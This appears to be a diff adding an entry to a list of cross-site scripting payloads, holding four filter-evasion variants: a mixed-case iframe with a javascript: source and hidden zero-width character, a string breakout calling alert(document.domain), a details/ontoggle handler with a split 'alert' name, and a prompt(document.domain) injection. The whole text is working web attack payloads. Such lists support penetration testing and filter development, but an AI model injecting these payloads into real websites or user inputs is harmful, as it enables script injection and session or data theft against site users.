@@ -1,3 +1,4 @@
+<iFrAme/src=jaVascRipt​:alert(1)></iFramE>
 ";window.stop();alert(document.domain);// 
 <details open ontoggle​=content['al'%2B'ert'](1) >
  "*prompt(document.domain)*"
